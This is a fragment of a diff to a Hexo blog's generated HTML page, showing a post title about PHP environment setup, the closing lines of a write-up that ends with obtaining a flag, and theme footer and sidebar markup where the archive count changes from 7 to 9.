 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="一、调试搭建"   >
           <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
@@ -4153,4 +4458,4 @@ exit;
 <p>回车</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
 <p>得到flag</p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">9</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
